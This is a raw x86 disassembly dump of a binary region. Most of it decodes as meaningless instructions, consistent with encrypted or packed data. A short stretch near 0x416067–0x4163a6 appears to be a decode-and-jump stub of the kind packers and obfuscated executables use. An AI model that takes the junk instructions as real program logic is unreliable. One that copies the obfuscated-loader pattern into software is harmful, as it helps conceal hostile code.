  415d94:	adc    al,0x6c
  415d96:	data16 or al,BYTE PTR [ecx-0x468f80f6]
  415d9d:	jle    0x415e0f
  415d9f:	jo     0x415d5c
  415da1:	inc    ebx
  415da2:	pop    ecx
  415da3:	push   es
  415da4:	mov    BYTE PTR [ecx-0x5bac233f],0xf0
  415dab:	aas    
  415dac:	push   edi
  415dad:	push   eax
  415dae:	scas   al,BYTE PTR es:[edi]
  415daf:	frstor [eax-0x1a]
  415db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415db3:	xchg   esp,eax
  415db4:	push   ebp
  415db5:	mov    BYTE PTR ds:0xce23fd9a,ah
  415dbb:	sbb    al,0x45
  415dbd:	fsubr  QWORD PTR ss:[ebx-0x1b]
  415dc1:	mov    dl,0x9c
  415dc3:	inc    edx
  415dc4:	xchg   BYTE PTR [esi+0x3431621f],dh
  415dca:	mov    ebx,0xdf19b5f6
  415dcf:	sub    BYTE PTR [ecx-0x5c75c973],0xd8
  415dd6:	adc    ecx,DWORD PTR [edi-0x52390af9]
  415ddc:	xor    al,BYTE PTR [edi+0x11ef7e93]
  415de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415de3:	jg     0x415df5
  415de5:	xchg   ch,ch
  415de7:	jno    0x415dab
  415de9:	pop    edx
  415dea:	pop    ebp
  415deb:	fcomi  st,st(6)
  415ded:	xchg   ebp,eax
  415dee:	pop    es
  415def:	pop    ds
  415df0:	pop    ebp
  415df1:	inc    ebp
  415df2:	iret   
  415df3:	ret    
  415df4:	rol    BYTE PTR [edi],cl
  415df6:	and    al,0xfe
  415df8:	inc    edx
  415df9:	xor    al,0x8
  415dfb:	mov    ds:0x502828af,eax
  415e00:	out    0xba,eax
  415e02:	cwde   
  415e03:	(bad)  
  415e04:	repz cmp al,0x32
  415e07:	and    DWORD PTR [eax+0x6f],esp
  415e0a:	dec    esi
  415e0b:	inc    edi
  415e0c:	adc    ecx,0xffffffba
  415e0f:	xor    bh,BYTE PTR [esi-0x6846e63]
  415e15:	pushf  
  415e16:	jle    0x415df6
  415e18:	mov    ah,0x2a
  415e1a:	aaa    
  415e1b:	popf   
  415e1c:	shl    eax,cl
  415e1e:	lahf   
  415e1f:	mov    ebx,0xf337b2c7
  415e24:	inc    ebp
  415e25:	das    
  415e26:	cli    
  415e27:	sub    ah,bh
  415e29:	je     0x415e38
  415e2b:	pop    edi
  415e2c:	inc    edx
  415e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e2e:	in     al,0x65
  415e30:	dec    esp
  415e31:	mov    esp,0x7fdd83
  415e36:	add    DWORD PTR [ecx+0x6e832314],ebx
  415e3c:	push   esi
  415e3d:	jle    0x415e75
  415e3f:	sti    
  415e40:	lods   al,BYTE PTR ds:[esi]
  415e41:	leave  
  415e42:	jmp    0xa306:0xfad7f650
  415e49:	pop    ecx
  415e4a:	mov    edx,0x8ee5a0c3
  415e4f:	test   ecx,eax
  415e51:	sbb    ah,0x72
  415e54:	and    eax,0x533c2437
  415e59:	jl     0x415e58
  415e5b:	adc    eax,0x94929a11
  415e60:	push   esp
  415e61:	cmp    eax,0xd6099ea0
  415e66:	int    0xa7
  415e68:	(bad)  
  415e6b:	not    BYTE PTR [ecx-0x33]
  415e6e:	in     eax,0x3b
  415e70:	pop    esp
  415e71:	fimul  WORD PTR [edi-0x7dc92820]
  415e77:	lds    esp,FWORD PTR [ebp-0x4f]
  415e7a:	fisubr WORD PTR [esi]
  415e7c:	(bad)  
  415e7d:	pop    esi
  415e7e:	sbb    esi,ebx
  415e80:	in     al,dx
  415e81:	or     dh,BYTE PTR [edx+0x3ed82d59]
  415e87:	mov    al,0xe3
  415e89:	pop    es
  415e8a:	movups xmm4,xmm4
  415e8d:	jmp    DWORD PTR [edx]
  415e8f:	leave  
  415e90:	sub    al,0x3a
  415e92:	dec    esp
  415e93:	nop
  415e94:	adc    DWORD PTR [eax-0x18f4b43f],edi
  415e9a:	fucom  st(6)
  415e9c:	clc    
  415e9d:	and    DWORD PTR [eax+ebp*2+0x4],eax
  415ea1:	sub    al,0x78
  415ea3:	in     eax,dx
  415ea4:	xchg   ebx,eax
  415ea5:	in     eax,0x56
  415ea7:	aaa    
  415ea8:	ret    
  415ea9:	pop    esi
  415eaa:	in     eax,0xf9
  415eac:	aas    
  415ead:	cld    
  415eae:	sbb    DWORD PTR [ecx],ebx
  415eb0:	or     DWORD PTR [ecx],0x5fd0a219
  415eb6:	mov    ebx,0x7f746229
  415ebb:	test   DWORD PTR [ebp-0x6a25b597],ebx
  415ec1:	rcl    BYTE PTR [esi-0x676f7ed5],0x2c
  415ec8:	lock pop edi
  415eca:	add    al,0x43
  415ecc:	(bad)  
  415ecd:	out    0xcf,eax
  415ecf:	sub    al,bh
  415ed1:	jmp    0x64c5faf
  415ed6:	add    al,0x3c
  415ed8:	mov    al,ds:0xde5ed4d9
  415edd:	cwde   
  415ede:	clc    
  415edf:	sahf   
  415ee0:	mov    dh,0xcd
  415ee2:	popf   
  415ee3:	test   ecx,edi
  415ee5:	in     eax,0xd6
  415ee7:	mov    al,0xe8
  415ee9:	ins    DWORD PTR es:[edi],dx
  415eea:	in     al,0x92
  415eec:	xchg   esp,eax
  415eed:	iret   
  415eee:	das    
  415eef:	adc    ecx,DWORD PTR fs:[esi]
  415ef2:	fstp   DWORD PTR [edx*8-0x7e118ca1]
  415ef9:	aam    0x2
  415efb:	push   edi
  415efc:	nop
  415efd:	jp     0x415eb4
  415eff:	aaa    
  415f00:	fmul   DWORD PTR [edx+0x39]
  415f03:	xchg   esp,eax
  415f04:	jb     0x415f0c
  415f06:	cdq    
  415f07:	adc    edx,DWORD PTR [eax-0x26]
  415f0a:	(bad)  
  415f0b:	stos   DWORD PTR es:[edi],eax
  415f0c:	jmp    0x415f66
  415f0e:	pop    esp
  415f0f:	data16 gs arpl si,si
  415f13:	pop    ebp
  415f14:	fild   WORD PTR [ebx-0x1d]
  415f17:	xor    eax,0xc684cf45
  415f1c:	xchg   ecx,eax
  415f1d:	ret    0xea52
  415f20:	jmp    0x7a7ff3aa
  415f25:	icebp  
  415f26:	xchg   ecx,eax
  415f27:	rcr    BYTE PTR [eax-0x2b],cl
  415f2a:	cmp    eax,0x871108e8
  415f2f:	cmp    al,BYTE PTR [ecx+0x6213f9e3]
  415f35:	pop    ebx
  415f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f37:	popa   
  415f38:	fs dec eax
  415f3a:	(bad)  
  415f3b:	fcmovb st,st(2)
  415f3d:	jbe    0x415ed1
  415f3f:	xor    dh,BYTE PTR [edi+0x33faceb]
  415f45:	jmp    0x6299:0xb1615fcb
  415f4c:	mov    dl,0x8d
  415f4e:	call   0x5be99974
  415f53:	cmp    eax,0x9cf3712a
  415f58:	les    esp,FWORD PTR [eax-0x7]
  415f5b:	cld    
  415f5c:	push   eax
  415f5d:	or     eax,0xdf85033a
  415f62:	or     DWORD PTR [edx],edi
  415f64:	popf   
  415f65:	ret    
  415f66:	int3   
  415f67:	and    edi,esi
  415f69:	mov    edi,0x76115fe
  415f6e:	sti    
  415f6f:	adc    edx,DWORD PTR [ebp-0xc]
  415f72:	jnp    0x415fe8
  415f74:	or     al,0xb7
  415f76:	adc    dl,BYTE PTR ds:0x11f296ec
  415f7c:	jmp    0xe0ed:0x4c7309a4
  415f83:	or     esi,DWORD PTR gs:[edx-0x3613b6d6]
  415f8a:	push   ebx
  415f8b:	xor    bh,bl
  415f8d:	pop    ebp
  415f8e:	pop    esp
  415f8f:	dec    edi
  415f90:	sub    cl,BYTE PTR [eax-0x6b]
  415f93:	jge    0x415f36
  415f95:	push   0xa6e6c34d
  415f9a:	sbb    bh,BYTE PTR [esi]
  415f9c:	div    BYTE PTR [edx+0x61]
  415f9f:	aas    
  415fa0:	mov    WORD PTR [esi],gs
  415fa2:	fdiv   DWORD PTR [ecx-0xa3a8b63]
  415fa8:	shl    DWORD PTR [ebx+0x6e5bd5e],1
  415fae:	and    ebp,DWORD PTR [ebx+0x195cf70f]
  415fb4:	dec    edi
  415fb5:	hlt    
  415fb6:	xor    BYTE PTR [ecx],0xe2
  415fb9:	lea    ebx,ds:0x4157ee0e
  415fbf:	mov    gs,WORD PTR [ecx+0x4d7274bc]
  415fc5:	add    DWORD PTR [edi],edi
  415fc7:	in     eax,dx
  415fc8:	das    
  415fc9:	pop    ss
  415fca:	pop    ss
  415fcb:	sub    DWORD PTR [bx+di+0x68a],esp
  415fd0:	sub    ah,BYTE PTR [ecx]
  415fd2:	dec    esi
  415fd3:	jb     0x415ff7
  415fd5:	retf   
  415fd6:	adc    ah,BYTE PTR [edi]
  415fd8:	jb     0x415fd3
  415fda:	adc    eax,ebp
  415fdc:	xchg   edi,eax
  415fdd:	inc    eax
  415fde:	test   al,0x39
  415fe0:	xchg   DWORD PTR [edi],edx
  415fe2:	mov    al,ds:0x8f0b0841
  415fe7:	daa    
  415fe8:	stos   BYTE PTR es:[edi],al
  415fe9:	add    dh,ah
  415feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fec:	sbb    al,0xe6
  415fee:	mov    esi,0x87821be3
  415ff3:	adc    al,0x34
  415ff5:	pushfw 
  415ff7:	mov    al,0x84
  415ff9:	jno    0x415fb1
  415ffb:	ret    0x10c7
  415ffe:	enter  0xe666,0x91
  416002:	ins    BYTE PTR es:[edi],dx
  416003:	sbb    eax,0xf427ed64
  416008:	adc    al,0x81
  41600a:	and    al,0xd7
  41600c:	test   eax,0x34fad8e8
  416011:	xchg   esi,eax
  416012:	popa   
  416013:	sub    ch,BYTE PTR [ecx]
  416015:	ins    BYTE PTR es:[edi],dx
  416016:	xchg   al,bh
  416018:	inc    ecx
  416019:	js     0x41603e
  41601b:	fidivr DWORD PTR [edx-0x22aa0612]
  416021:	lods   al,BYTE PTR ds:[esi]
  416022:	arpl   cx,cx
  416024:	outs   dx,BYTE PTR ds:[esi]
  416025:	scas   eax,DWORD PTR es:[edi]
  416026:	sar    BYTE PTR [edx+0x8d42],cl
  41602c:	adc    BYTE PTR [esi+0x49350c11],dl
  416032:	dec    esi
  416033:	inc    ebp
  416034:	mov    al,0xbb
  416036:	adc    eax,0x1af73530
  41603b:	pop    es
  41603c:	(bad)  
  41603d:	in     eax,0x5c
  41603f:	les    ecx,FWORD PTR [ecx+0x1d67409e]
  416045:	cli    
  416046:	fs inc esp
  416048:	scas   al,BYTE PTR es:[edi]
  416049:	fistp  WORD PTR [edx+0x40]
  41604c:	xchg   esp,eax
  41604d:	mov    ecx,0x27965f54
  416052:	jnp    0x416091
  416054:	push   0x933153b6
  416059:	dec    ecx
  41605a:	dec    edx
  41605b:	imul   ecx,DWORD PTR [ebp+0x71a522d6],0x415ec4c2
  416065:	aam    0xea
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416021
  41609a:	xchg   edx,eax
  41609b:	ins    BYTE PTR es:[di],dx
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x4160dd
  4160a6:	inc    esi
  4160a7:	sbb    bl,bl
  4160a9:	sub    al,0xbc
  4160ab:	inc    ebp
  4160ac:	scas   al,BYTE PTR es:[edi]
  4160ad:	push   ebp
  4160ae:	dec    ebp
  4160af:	ret    
  4160b0:	and    al,ch
  4160b2:	mov    al,ds:0x466f56a4
  4160b7:	adc    eax,0xbb8d9bf2
  4160bc:	adc    esi,DWORD PTR [ebx+0x33efdb9a]
  4160c2:	sub    eax,0xa6fba1d5
  4160c7:	(bad)  
  4160c8:	loop   0x4160db
  4160ca:	es pop es
  4160cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160cd:	inc    ebx
  4160ce:	push   esp
  4160cf:	mov    esi,0xdc4aae0
  4160d4:	test   DWORD PTR [ebx-0x60],ecx
  4160d7:	push   ecx
  4160d8:	outs   dx,BYTE PTR ds:[esi]
  4160d9:	ss xchg esp,eax
  4160db:	sbb    eax,0x1e17c375
  4160e0:	and    dh,BYTE PTR [edi+0x67]
  4160e3:	adc    al,0xd2
  4160e5:	les    eax,FWORD PTR [esi+0x7383a33]
  4160eb:	sbb    eax,edi
  4160ed:	in     eax,0x69
  4160ef:	retf   0xf5a2
  4160f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160f3:	sub    esp,DWORD PTR [ecx-0x5acc389]
  4160f9:	cmp    edi,DWORD PTR [edi+esi*8]
  4160fc:	add    al,0xe8
  4160fe:	int3   
  4160ff:	push   0xffffff8a
  416101:	es ss jns 0x416163
  416105:	dec    ebx
  416106:	out    0x37,al
  416108:	sbb    esp,ebx
  41610a:	out    dx,al
  41610b:	push   0xf9815135
  416110:	jmp    0x7beba7d1
  416115:	aam    0x2c
  416117:	int3   
  416118:	inc    ebp
  416119:	mov    bh,0xe6
  41611b:	not    eax
  41611d:	imul   DWORD PTR [edx+eiz*8]
  416120:	push   0x30
  416122:	adc    eax,0x3b746526
  416127:	(bad)  
  41612a:	fcompp 
  41612c:	mov    bl,0xad
  41612e:	mov    ebx,0xb4ca273b
  416133:	mov    dh,0x42
  416135:	stc    
  416136:	std    
  416137:	jecxz  0x41610e
  416139:	outs   dx,BYTE PTR ds:[esi]
  41613a:	adc    BYTE PTR [edx],bh
  41613c:	xor    ebx,DWORD PTR [ebx-0x77640a47]
  416142:	es mov ecx,0xd6c2892f
  416148:	ds push 0xffffffa2
  41614b:	cs mov ah,0xea
  41614e:	pushf  
  41614f:	jl     0x416126
  416151:	xchg   bl,dh
  416153:	ins    DWORD PTR es:[edi],dx
  416154:	div    BYTE PTR [edx]
  416156:	mov    ebp,0xbd78db1e
  41615b:	std    
  41615c:	gs cmc 
  41615e:	xchg   DWORD PTR [esi-0x17fd38c2],ebx
  416164:	and    BYTE PTR [eax-0x647e801c],bl
  41616a:	jmp    0xa8da:0x3999a1bc
  416171:	ret    
  416172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416173:	fild   QWORD PTR [ebx]
  416175:	xchg   ah,ch
  416177:	inc    ebp
  416178:	ja     0x41616e
  41617a:	and    al,0x35
  41617c:	into   
  41617d:	mov    esi,DWORD PTR [esi]
  41617f:	mov    bl,0xcd
  416181:	pop    esi
  416182:	xor    ebx,DWORD PTR [esi+0xf]
  416185:	cmp    ebp,DWORD PTR [edx]
  416187:	cs sahf 
  416189:	inc    ecx
  41618a:	ror    DWORD PTR [edx],1
  41618c:	cmp    al,0xd0
  41618e:	xor    eax,0xd04da732
  416193:	fcom   DWORD PTR [esi+eiz*1]
  416196:	mov    al,ds:0xe58d768f
  41619b:	mov    al,ds:0x3e0f39e0
  4161a0:	ret    0xd01f
  4161a3:	hlt    
  4161a4:	fcmovne st,st(2)
  4161a6:	inc    eax
  4161a7:	mov    ds:0x5eee7d82,eax
  4161ac:	jne    0x4161f3
  4161ae:	call   0x8731f08e
  4161b3:	out    dx,eax
  4161b4:	sub    BYTE PTR [eax],dl
  4161b6:	mov    al,0x49
  4161b8:	in     eax,0xc2
  4161ba:	fisubr DWORD PTR [ebx]
  4161bc:	mul    DWORD PTR [edx-0x264eeebe]
  4161c2:	and    ebp,DWORD PTR [ecx+0x18]
  4161c5:	mov    al,0x97
  4161c7:	das    
  4161c8:	out    dx,al
  4161c9:	pop    ecx
  4161ca:	jbe    0x416215
  4161cc:	call   0xb065:0x29a0fb64
  4161d3:	out    0xb8,eax
  4161d5:	jp     0x416242
  4161d7:	jne    0x416179
  4161d9:	mov    dl,0x9
  4161db:	sub    al,0x78
  4161dd:	mov    edi,0x29aba507
  4161e2:	add    ebp,DWORD PTR ds:0xc15799e
  4161e8:	cmovl  ebx,DWORD PTR [eax]
  4161eb:	and    ebp,DWORD PTR [edi+0x62]
  4161ee:	loopne 0x416242
  4161f0:	jo     0x416198
  4161f2:	jo     0x41625e
  4161f4:	push   ebx
  4161f5:	rol    DWORD PTR [edi-0x15806a68],1
  4161fb:	sahf   
  4161fc:	inc    edx
  4161fd:	data16 loope 0x41620a
  416200:	inc    eax
  416201:	dec    ecx
  416202:	mov    eax,ds:0xfe954675
  416207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416208:	mov    ecx,0xa4a7669e
  41620d:	hlt    
  41620e:	test   eax,0x9296105a
  416213:	outs   dx,DWORD PTR ds:[esi]
  416214:	pop    edi
  416215:	dec    ebp
  416216:	mov    ebx,0xbd6126aa
  41621b:	stc    
  41621c:	jle    0x4161e9
  41621e:	xchg   ebx,eax
  41621f:	in     eax,0x4e
  416221:	mov    al,BYTE PTR [esi+esi*1-0x1f]
  416225:	mov    bl,0xea
  416227:	ror    cl,0xb5
  41622a:	bound  ebx,QWORD PTR [esi]
  41622c:	mov    dh,0x41
  41622e:	aad    0x65
  416230:	cli    
  416231:	ja     0x41623b
  416233:	inc    esp
  416234:	inc    esi
  416235:	fwait
  416236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416237:	jb     0x4161d7
  416239:	jmp    0x416246
  41623b:	and    ebx,DWORD PTR [esi]
  41623d:	inc    eax
  41623e:	cmc    
  41623f:	mov    eax,ds:0x51874e3c
  416244:	sub    DWORD PTR [edi+0x49],0x7a
  416248:	lods   al,BYTE PTR ds:[esi]
  416249:	jle    0x416244
  41624b:	addr16 nop
  41624d:	pushf  
  41624e:	cmp    eax,0x2afde14e
  416253:	and    ecx,DWORD PTR [edx-0x37]
  416256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416257:	add    cl,bl
  416259:	popa   
  41625a:	inc    ecx
  41625b:	std    
  41625c:	loop   0x416210
  41625e:	dec    ebx
  41625f:	mov    edi,0x23276c26
  416264:	call   0xd725dfff
  416269:	sbb    DWORD PTR [eax-0x1ad38e5a],eax
  41626f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416270:	out    0xa3,al
  416272:	es jmp 0xd622c99c
  416278:	dec    esi
  416279:	fist   DWORD PTR [eax+0x37]
  41627c:	add    eax,0xfa1ca03a
  416281:	(bad)  
  416282:	jns    0x4162db
  416284:	icebp  
  416285:	cmp    edi,esi
  416287:	lods   al,BYTE PTR ds:[esi]
  416288:	test   al,0xcf
  41628a:	mov    ebp,0x80feda20
  41628f:	enter  0x1964,0xf4
  416293:	inc    esi
  416294:	jne    0x41622a
  416296:	cs pop esp
  416298:	sahf   
  416299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41629a:	inc    esp
  41629b:	pop    ss
  41629c:	xor    dh,BYTE PTR [edx-0x68]
  41629f:	(bad)  
  4162a0:	xor    BYTE PTR [ecx-0x30],0x8f
  4162a4:	sti    
  4162a5:	rcl    BYTE PTR [eax+eax*2-0x62],1
  4162a9:	inc    esi
  4162aa:	enter  0x7fc,0x7a
  4162ae:	pop    esi
  4162af:	push   esi
  4162b0:	add    DWORD PTR [eax-0x74],edx
  4162b3:	jmp    0x2009:0x4ade81c6
  4162ba:	pop    edx
  4162bb:	fld    DWORD PTR [esi+eax*1+0x27]
  4162bf:	aaa    
  4162c0:	pop    esi
  4162c1:	xchg   ebp,edi
  4162c3:	pop    ecx
  4162c4:	mov    eax,0x6a7e3f47
  4162c9:	sbb    DWORD PTR [edx],esi
  4162cb:	inc    edx
  4162cc:	jecxz  0x41625d
  4162ce:	test   BYTE PTR [esi+0x7b7fdadd],ch
  4162d4:	pusha  
  4162d5:	mov    DWORD PTR [edi+0x3edfa579],eax
  4162db:	leave  
  4162dc:	mov    eax,0x5cbe315c
  4162e1:	(bad)  
  4162e2:	jne    0x4162b4
  4162e4:	pop    edx
  4162e5:	sub    al,0xe6
  4162e7:	and    DWORD PTR [edx-0x19],0xffffffde
  4162eb:	add    al,0x51
  4162ed:	jecxz  0x4162c8
  4162ef:	jp     0x41633e
  4162f1:	out    dx,eax
  4162f2:	int    0x61
  4162f4:	or     eax,0x1b46cf46
  4162f9:	inc    eax
  4162fa:	shl    bl,1
  4162fc:	jge    0x416312
  4162fe:	in     eax,dx
  4162ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416300:	and    BYTE PTR [edx],dh
  416302:	imul   edi,DWORD PTR [ecx+0x2adc9862],0x67
  416309:	push   edx
  41630a:	das    
  41630b:	scas   eax,DWORD PTR es:[edi]
  41630c:	pusha  
  41630d:	popa   
  41630e:	into   
  41630f:	jae    0x41631f
  416311:	adc    edi,ebx
  416313:	xchg   DWORD PTR [eax],esi
  416315:	inc    ebp
  416316:	sbb    DWORD PTR [esi+edi*8+0x43],eax
  41631a:	xor    dl,bh
  41631c:	loop   0x41638c
  41631e:	ins    BYTE PTR es:[edi],dx
  41631f:	push   edx
  416320:	inc    esp
  416321:	inc    ebp
  416322:	stos   DWORD PTR es:[edi],eax
  416323:	mov    esp,0xb519f7ae
  416328:	xchg   BYTE PTR [eax+ebp*1+0x6f974b0a],al
  41632f:	and    cl,BYTE PTR [ecx]
  416331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416332:	and    cl,BYTE PTR [ebp+eiz*2-0x346a447f]
  416339:	sub    al,0x23
  41633b:	ffree  st(3)
  41633d:	je     0x416305
  41633f:	sar    edx,cl
  416341:	xchg   DWORD PTR [ebx+0x2f],edx
  416344:	jns    0x416349
  416346:	and    al,0x72
  416348:	ds aad 0x6a
  41634b:	mov    ss,WORD PTR [esi+ecx*8-0x49ec5be3]
  416352:	and    DWORD PTR [esi+ebx*1-0xca12307],ebp
  416359:	xor    eax,0xf2463c40
  41635e:	and    al,0x97
  416360:	enter  0xae5f,0xda
  416364:	push   cs
  416365:	out    dx,al
  416366:	popa   
  416367:	jbe    0x4163c9
  416369:	out    0xf7,eax
  41636b:	cdq    
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xe124c841
  4163bf:	cmp    bl,ch
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163bc
  4163ca:	fs add dh,dh
  4163cd:	sub    al,0xbc
  4163cf:	test   esi,0x8724e6d3
  4163d5:	mov    edx,0xd8486bc6
  4163da:	cmp    dh,0xde
  4163dd:	or     ah,BYTE PTR [edi+0x7bfdbe79]
  4163e3:	fisttp WORD PTR [ebp-0x4a]
  4163e6:	lods   al,BYTE PTR ds:[esi]
  4163e7:	(bad)  
  4163e8:	aaa    
  4163e9:	fld    QWORD PTR [ebp-0x58b3768a]
  4163ef:	mov    esi,0x721beebc
  4163f4:	push   esp
  4163f5:	lds    esp,FWORD PTR [esi]
  4163f7:	out    dx,al
  4163f8:	xor    esp,DWORD PTR [eax+0x71]
  4163fb:	imul   ebp,DWORD PTR [eax+0x2e3be057],0xffffff8b
  416402:	(bad)  
  416403:	ja     0x4163f6
  416405:	add    bl,BYTE PTR [esi+ebx*4+0x38]
  416409:	mov    ah,0x6c
  41640b:	js     0x416422
  41640d:	sbb    eax,ebp
  41640f:	sbb    edi,ebx
  416411:	popa   
  416412:	or     DWORD PTR [edi+ebp*4+0x11f92ad0],ebx
  416419:	pop    ds
  41641a:	xlat   BYTE PTR ds:[ebx]
  41641b:	and    eax,0xb06e1667
  416420:	xor    dl,BYTE PTR [ebp-0x49825b0e]
  416426:	ret    0xf077
  416429:	xlat   BYTE PTR ds:[ebx]
  41642a:	pop    ebx
  41642b:	pop    ss
  41642c:	jge    0x4163f4
  41642e:	stc    
  41642f:	xor    ch,BYTE PTR [esi+0x79aa6fa0]
  416435:	mov    WORD PTR [esi+0x332aed3],gs
  41643b:	mov    ebx,0xeec2849c
  416440:	(bad)  
  416441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416442:	jle    0x4163f6
  416444:	jge    0x416438
  416446:	popf   
  416447:	adc    eax,0xa11a8819
  41644c:	push   ecx
  41644d:	add    BYTE PTR [edi+0x6724fc10],0x36
  416454:	in     al,0x41
  416456:	mov    ebp,esp
  416458:	push   esp
  416459:	jb     0x4164be
  41645b:	fcomp  DWORD PTR [esi]
  41645d:	pop    ds
  41645e:	xlat   BYTE PTR ds:[ebx]
  41645f:	jb     0x4163e7
  416461:	and    al,0x52
  416464:	lock mov al,BYTE PTR [eax]
  416467:	in     al,dx
  416468:	lea    eax,ds:[edi+eax*8]
  41646c:	ds stos DWORD PTR es:[edi],eax
  41646e:	cmc    
  41646f:	and    eax,edx
  416471:	jle    0x4164b1
  416473:	add    eax,0x294b6067
  416478:	inc    ebp
  416479:	cmp    ah,BYTE PTR [ebx]
  41647b:	ret    
  41647c:	mov    eax,ds:0x9bf05448
  416481:	lahf   
  416482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416483:	xor    edi,DWORD PTR [ebp-0x29673cb1]
  416489:	jp     0x4164a9
  41648b:	sub    esi,DWORD PTR [ecx+ebx*8]
  41648e:	(bad)  
  41648f:	ja     0x41645f
  416491:	cvtdq2ps xmm4,xmm3
  416494:	int    0xfe
  416496:	pushf  
  416497:	push   edx
  416498:	lahf   
  416499:	sub    al,0x9b
  41649b:	cmc    
  41649c:	adc    DWORD PTR [ecx+ebp*1+0x58],0xf32e480
  4164a4:	xchg   ecx,edi
  4164a6:	sysret 
  4164a8:	mov    ecx,eax
  4164aa:	push   ds
  4164ab:	repnz neg DWORD PTR [edi]
  4164ae:	adc    al,0x13
  4164b0:	sub    BYTE PTR [edx-0x22dc57c],bl
  4164b6:	fnsave [ecx]
  4164b8:	xor    al,0x18
  4164ba:	jns    0x41649b
  4164bc:	fs js  0x41646e
  4164bf:	and    DWORD PTR [ebp-0x3eaae53c],edx
  4164c5:	fwait
  4164c6:	outs   dx,DWORD PTR ds:[esi]
  4164c7:	mul    dl
  4164c9:	add    DWORD PTR [ebx],edi
  4164cb:	out    dx,eax
  4164cc:	ror    DWORD PTR [ebx+edx*1],1
  4164cf:	adc    ebp,edx
  4164d1:	cwde   
  4164d2:	adc    bh,BYTE PTR [ebx]
  4164d4:	pop    edx
  4164d5:	inc    esi
  4164d6:	mov    dh,ah
  4164d8:	ja     0x4164c6
  4164da:	mov    ch,0x35
  4164dc:	push   ebp
  4164dd:	sti    
  4164de:	pop    esp
  4164df:	jne    0x416521
  4164e1:	rcl    bl,cl
  4164e3:	sub    al,0xe4
  4164e5:	fsubp  st(0),st
  4164e7:	mov    bl,0x42
  4164e9:	sub    BYTE PTR [esi],al
  4164eb:	into   
  4164ec:	mov    WORD PTR [esi-0x49],?
  4164ef:	(bad)  
  4164f0:	mov    dh,0x55
  4164f2:	cwde   
  4164f3:	(bad)
  4164f6:	(bad)  
  4164f7:	xor    al,0xa9
  4164f9:	or     al,0x9a
  4164fb:	inc    esi
  4164fc:	and    al,0x2d
  4164fe:	add    BYTE PTR [ecx],al
  416500:	std    
  416501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416502:	mov    edx,0x2f2fa1e0
  416507:	sub    edi,DWORD PTR [edx]
  416509:	ret    
  41650a:	jbe    0x4164a0
  41650c:	xchg   ebx,eax
  41650d:	cwde   
  41650e:	leave  
  41650f:	xor    BYTE PTR [edi-0x19],bh
  416512:	jmp    0x4164fa
  416514:	mov    DWORD PTR [eax+0x3f4e12e9],eax
  41651a:	test   DWORD PTR [ebp+0x44],ecx
  41651d:	ds jp  0x41658b
  416520:	in     eax,0xde
  416522:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416524:	mov    cl,0x16
  416526:	mov    dh,0x51
  416528:	pop    eax
  416529:	or     esp,esi
  41652b:	xor    eax,DWORD PTR [edi]
  41652d:	ss cmp eax,0x753d6bec
  416533:	push   edx
  416534:	xchg   edi,eax
  416535:	mov    cl,0xf0
  416537:	popa   
  416538:	outs   dx,DWORD PTR ds:[esi]
  416539:	and    esi,DWORD PTR [edi-0x1b]
  41653c:	push   ss
  41653d:	xor    eax,0xf13d21e4
  416542:	mov    ah,0xb4
  416544:	or     esi,DWORD PTR [ecx]
  416546:	add    cl,BYTE PTR [edx-0x7f]
  416549:	xor    al,0xc2
  41654b:	add    DWORD PTR [edx-0x2baadf54],ebp
  416551:	fcmovnu st,st(6)
  416553:	inc    esp
